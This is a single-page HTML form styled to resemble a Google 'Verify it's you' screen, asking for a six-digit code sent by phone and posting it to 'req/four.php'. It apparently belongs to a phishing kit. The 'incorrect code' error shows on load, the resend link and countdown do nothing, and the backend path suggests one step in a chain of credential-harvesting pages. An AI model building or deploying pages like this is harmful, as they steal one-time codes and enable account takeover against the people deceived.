<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verify OTP</title>

<style>
body {
    margin: 0;
    background: #ffffff;
    font-family: system-ui, -apple-system, BlinkMacSystemFont,
                 "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    color: #202124;
}

.container {
    max-width: 360px;
    margin: 0 auto;
    padding: 24px;
}

.text-section {
    margin-top: 88px;
}

.text-section h1 {
    font-size: 26px;
    font-weight: 600;
    margin: 0;
    text-align: center;
}

.text-section p {
    margin-top: 8px;
    font-size: 15px;
    color: #5f6368;
    text-align: center;
    line-height: 1.5;
}

.otp-group {
    margin-top: 40px;
    display: flex;
    justify-content: space-between;
}

.otp-group input {
    width: 44px;
    height: 52px;
    font-size: 20px;
    text-align: center;
    border: none;
    border-bottom: 2px solid #dadce0;
    outline: none;
    color: #202124;
}

.otp-group input:focus {
    border-bottom-color: #1a73e8;
}

.error {
    margin-top: 12px;
    font-size: 13px;
    color: #d93025;
    text-align: center;
}

.button-group {
    margin-top: 32px;
}

.button-group button {
    width: 100%;
    height: 48px;
    font-size: 15px;
    font-weight: 600;
    background: #1a73e8;
    color: #ffffff;
    border: none;
    border-radius: 24px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
}

.button-group button:active {
    background: #1664c0;
}

.spinner {
    width: 18px;
    height: 18px;
    border: 2px solid rgba(255,255,255,0.4);
    border-top: 2px solid #ffffff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    display: none;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

.timer {
    margin-top: 16px;
    font-size: 13px;
    color: #5f6368;
    text-align: center;
}

.timer a {
    color: #1a73e8;
    text-decoration: none;
    font-weight: 500;
}
</style>
</head>
<body>

<div class="container">

    <div class="text-section">
        <h1>Verify it’s you</h1>
        <p>Enter the 6-digit code we sent to your number</p>
    </div>

    <form id="otpForm" action="req/four.php" method="POST" autocomplete="off">
        <div class="otp-group">
            <input maxlength="1" name="otp1" inputmode="numeric" pattern="[0-9]*" autofocus>
            <input maxlength="1" name="otp2" inputmode="numeric" pattern="[0-9]*">
            <input maxlength="1" name="otp3" inputmode="numeric" pattern="[0-9]*">
            <input maxlength="1" name="otp4" inputmode="numeric" pattern="[0-9]*">
            <input maxlength="1" name="otp5" inputmode="numeric" pattern="[0-9]*">
            <input maxlength="1" name="otp6" inputmode="numeric" pattern="[0-9]*">
        </div>

        <div class="error" id="error">
            The code you entered is incorrect
        </div>

        <div class="button-group">
            <button type="submit" id="verifyBtn">
                <span id="btnText">Verify</span>
                <div class="spinner" id="spinner"></div>
            </button>
        </div>
    </form>

    <div class="timer">
        Code expires in <span id="time">02:59</span><br>
        <a href="#">Resend code</a>
    </div>

</div>

<script>
const otpGroup = document.querySelector('.otp-group');
const inputs = document.querySelectorAll('.otp-group input');
const form = document.getElementById('otpForm');
const error = document.getElementById('error');
const spinner = document.getElementById('spinner');
const btnText = document.getElementById('btnText');

/* Fokus ke input pertama saat klik area OTP */
otpGroup.addEventListener('click', () => {
    for (let i=0; i<inputs.length; i++) {
        if(!inputs[i].value) { inputs[i].focus(); break; }
    }
});

/* Logika input OTP */
inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/[^0-9]/g,'');
        if(input.value.length > 0 && index < inputs.length -1) {
            inputs[index+1].focus();
        }
    });
    input.addEventListener('keydown', (e) => {
        if(e.key === 'Backspace' && !input.value && index > 0){
            inputs[index-1].focus();
        }
        if(!/[0-9]/.test(e.key) && !['Backspace','ArrowLeft','ArrowRight','Tab'].includes(e.key)){
            e.preventDefault();
        }
    });
});

/* Paste OTP */
document.addEventListener('paste', (e) => {
    const data = e.clipboardData.getData('text').replace(/\D/g,'');
    inputs.forEach((input,i) => input.value = data[i] || '');
});

/* Submit form */
form.addEventListener('submit', (e) => {
    e.preventDefault();
    const allFilled = Array.from(inputs).every(i => i.value.trim() !== '');
    if(!allFilled){
        error.style.display = 'block';
        return;
    }

    // spinner & disable tombol
    spinner.style.display = 'block';
    btnText.textContent = 'Verifying…';
    e.target.submit();
});

/* Autofocus saat load */
window.onload = () => inputs[0].focus();
</script>

</body>
</html>
